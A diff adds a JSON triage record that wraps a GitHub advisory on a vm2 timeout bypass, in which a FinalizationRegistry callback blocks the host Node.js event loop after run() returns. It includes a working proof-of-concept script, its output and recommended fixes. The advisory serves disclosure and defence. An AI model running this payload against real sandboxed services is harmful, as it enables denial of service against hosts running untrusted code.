@@ -1,0 +1,61 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"comments\": 5, \"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/71620770?v=4\", \"events_url\": \"https://api.github.com/users/mausamrijall/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/mausamrijall/followers\", \"following_url\": \"https://api.github.com/users/mausamrijall/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/mausamrijall/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/mausamrijall\", \"id\": 71620770, \"login\": \"mausamrijall\", \"node_id\": \"MDQ6VXNlcjcxNjIwNzcw\", \"organizations_url\": \"https://api.github.com/users/mausamrijall/orgs\", \"received_events_url\": \"https://api.github.com/users/mausamrijall/received_events\", \"repos_url\": \"https://api.github.com/users/mausamrijall/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/mausamrijall/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/mausamrijall/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/mausamrijall\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-92942\", \"cvss\": {\"score\": 7.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 7.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-400\", \"name\": \"Uncontrolled Resource Consumption\"}, {\"cwe_id\": \"CWE-841\", \"name\": \"Improper Enforcement of Behavioral Workflow\"}], \"description\": \"### Vulnerability Summary\\n \\nvm2's `VM({ timeout })` option is documented and relied upon as the mechanism that bounds how long sandboxed code may execute. In the current implementation, the timeout only wraps the single synchronous call to `VM#run()` (via `doWithTimeout` → `this._runScript(script)` in `lib/vm.js`). It does not, and structurally cannot, bound code that the V8 engine itself schedules to run *after* that call has already returned.\\n \\n`FinalizationRegistry` and `WeakRef` are exposed to sandboxed code completely unmodified — they are not present anywhere in `lib/setup-sandbox.js`'s list of specially-wrapped/hardened globals (only `WeakMap`, `Promise`, `Proxy`, `Reflect`, etc. receive hardening there). Sandboxed code can register a `FinalizationRegistry` callback against an object it creates and immediately drops. `VM#run()` returns normally, well within the configured timeout, because registration is instant. At some later point — determined entirely by the V8 garbage collector, and forceable on demand by the host process (e.g. under memory pressure, or via `--expose-gc`) — the engine invokes the sandboxed cleanup callback directly. This invocation is **not** mediated by `doWithTimeout`, `Script.runInContext({timeout})`, or any other vm2 accounting mechanism, because it isn't a new call to `VM#run()` at all — it's the GC's own native callback-invocation path.\\n\\n## Affected Code & Version\\n \\n- **Repository:** `patriksimek/vm2`\\n- **Version tested:** `3.11.6` (commit `a5b31cd9c01b37139aa9c71df1c691a6d1b440f9`, 2026-08-14) — the current `main` branch, i.e. this reproduces on the latest release, after all 2026 CVE-wave fixes (CVE-2026-22709, CVE-2026-26956, and the May 2026 13-advisory batch).\\n- **`lib/vm.js`, `run()` (~line 501) and `doWithTimeout()` (~line 105):** the `timeout` option only wraps the single call to `this._runScript(script)`. No mechanism exists to bound execution triggered by engine-internal callbacks scheduled outside that call.\\n- **`lib/setup-sandbox.js`, lines 1–14:** the module's captured/hardened globals list (`LocalWeakMap`, `LocalProxy`, `LocalError`, etc.) does not include `FinalizationRegistry` or `WeakRef`. Repo-wide `grep` for `FinalizationRegistry|WeakRef` returns zero matches in `lib/`, confirming neither receives any wrapping, restriction, or special handling — they are exposed to sandboxed code as bare, fully-functional constructors.\\n## Steps to Reproduce\\n \\nEnvironment: Node.js v22.22.2, vm2 checked out at the commit above, dependencies installed with `npm install`.\\n \\n1. Clone and install:\\n```\\n   git clone https://github.com/patriksimek/vm2.git\\n   cd vm2 && npm install\\n```\\n2. Save as `poc_timeout_bypass.js` in the repo root:\\n```js\\n   const { VM } = require('./lib/main.js');\\n \\n   const CONFIGURED_TIMEOUT_MS = 200;\\n   const vm = new VM({ timeout: CONFIGURED_TIMEOUT_MS });\\n \\n   const t0 = Date.now();\\n   let runError = null;\\n   try {\\n     vm.run(`\\n       let target = {};\\n       const registry = new FinalizationRegistry(() => {\\n         const busyStart = Date.now();\\n         while (Date.now() - busyStart < 3000) { /* burn CPU, block event loop */ }\\n       });\\n       registry.register(target, 'held-value');\\n       target = null; // drop only strong reference -> GC-eligible\\n     `);\\n   } catch (e) { runError = e.message; }\\n   const t1 = Date.now();\\n   console.log('vm.run() returned after', t1 - t0, 'ms. Threw:', runError);\\n \\n   if (!global.gc) { console.log('Re-run with --expose-gc'); process.exit(1); }\\n   global.gc(); global.gc();\\n \\n   const timerScheduledAt = Date.now();\\n   setTimeout(() => {\\n     const delay = Date.now() - timerScheduledAt;\\n     console.log('Host setTimeout(10ms) actually fired after', delay, 'ms');\\n     console.log('Total wall time since vm.run() returned:', Date.now() - t1, 'ms');\\n   }, 10);\\n```\\n3. Run: `node --expose-gc poc_timeout_bypass.js`\\n4. **Observed output:**\\n```\\n   vm.run() returned after 2 ms. Threw: null\\n   Host setTimeout(10ms) actually fired after 3000 ms\\n   Total wall time since vm.run() returned: 3029 ms\\n```\\n5. **Interpretation:** `run()` returned in 2ms, well inside the configured 200ms timeout — vm2 believes execution completed safely. A host-side timer scheduled for 10ms did not fire until ~3000ms later, proving the entire Node.js event loop — not just the sandbox — was blocked by sandboxed code running 15x longer than the configured timeout, entirely after `run()` had returned and outside any timeout enforcement.\\n6. `typeof FinalizationRegistry` and `typeof WeakRef` inside a fresh `VM()` both evaluate to `\\\"function\\\"` with no wrapping, confirming the surface is reachable by design, not by an incidental leak.\\n## Fix Recommendation\\n \\nPick one or combine:\\n \\n1. **Remove `FinalizationRegistry` and `WeakRef` from the sandbox global scope by default.** These are rarely needed by untrusted scripts and their GC-driven, engine-scheduled invocation model is fundamentally incompatible with a wall-clock `timeout` promise. Delete them from the context in `lib/setup-sandbox.js` alongside the other hardening done there, mirroring how other dangerous globals are handled.\\n2. **If they must remain available**, wrap `FinalizationRegistry`'s constructor so the callback the sandbox supplies is itself invoked through a host-side dispatcher that re-applies a fresh per-invocation timeout (e.g. via `Script.runInContext` with `timeout` again, or by tracking cumulative CPU time via `process.hrtime`/`Isolate::TerminateExecution` if this is ever ported to a true isolate model). A callback that exceeds its budget should be forcibly terminated the same way an over-budget `run()` call is today.\\n3. **Document the gap explicitly** if neither is implemented immediately: the current README/docs describe `timeout` as bounding sandboxed execution without qualification. At minimum, callers should be warned that GC-triggered callbacks (`FinalizationRegistry`) are exempt.\\n\\n\\nany application that runs untrusted code through vm2 with a `timeout` expecting it to bound total CPU time can be denied service indefinitely. A single-line sandboxed script (`registry.register(target, x)` then drop the reference) can queue an unbounded busy-loop that fires at an unpredictable future moment and freezes the entire host Node.js process (single-threaded event loop) for as long as the attacker's loop runs — with no relationship at all to the configured `timeout` value. Because the freeze happens asynchronously and disconnected from the triggering `run()` call, it also undermines incident response: by the time the hang is observed, the `run()` call that caused it may be long gone from logs/traces.\\n \\nThis is a **timeout-enforcement bypass / uncontrolled resource consumption** issue, not (as currently demonstrated) a proxy/realm escape to host object access — sandboxed code stays within its own realm. See \\\"What this report does not claim\\\" below.\", \"epss\": {\"percentage\": 0.00488, \"percentile\": 0.39533}, \"ghsa_id\": \"GHSA-r4fx-v8hh-22mv\", \"github_reviewed_at\": \"2026-10-05T22:35:04Z\", \"html_url\": \"https://github.com/advisories/GHSA-r4fx-v8hh-22mv\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-r4fx-v8hh-22mv\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-92942\"}], \"nvd_published_at\": null, \"published_at\": \"2026-10-05T22:35:04Z\", \"references\": [\"https://github.com/patriksimek/vm2/security/advisories/GHSA-r4fx-v8hh-22mv\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-92942\", \"https://github.com/patriksimek/vm2/commit/fe2fcca2a1e693548993eccc624489dc4cb586b4\", \"https://github.com/patriksimek/vm2/releases/tag/v3.11.7\", \"https://www.vulncheck.com/advisories/vm2-before-3.11.7-timeout-bypass-via-finalizationregistry\", \"https://github.com/advisories/GHSA-r4fx-v8hh-22mv\"], \"repository_advisory_url\": \"https://api.github.com/repos/patriksimek/vm2/security-advisories/GHSA-r4fx-v8hh-22mv\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/patriksimek/vm2\", \"summary\": \"vm2: timeout Option Bypass via FinalizationRegistry Cleanup Callback (Unbounded Host Event-Loop Block)\", \"type\": \"reviewed\", \"updated_at\": \"2026-10-05T22:35:04Z\", \"url\": \"https://api.github.com/advisories/GHSA-r4fx-v8hh-22mv\", \"vulnerabilities\": [{\"first_patched_version\": \"3.11.7\", \"package\": {\"ecosystem\": \"npm\", \"name\": \"vm2\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 3.11.6\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-r4fx-v8hh-22mv",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "kev_entries": {},
+    "kev_ransomware": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "vm2: <= 3.11.6"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-22709",
+      "CVE-2026-26956",
+      "CVE-2026-92942"
+    ],
+    "cvss_score": 7.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "vm2"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-10-06T19:13:48.930645Z",
+  "provenance": {
+    "content_sha256": "68635dea0ab32f5b791f01fb98f93fea978cc3bb0f95bdfc3e0e9feada4bb7b2",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-10-05T22:35:04Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-r4fx-v8hh-22mv",
+  "status": "active",
+  "title": "vm2: timeout Option Bypass via FinalizationRegistry Cleanup Callback (Unbounded Host Event-Loop Block)",
+  "updated_at": "2026-10-05T22:35:04Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-r4fx-v8hh-22mv"
+}
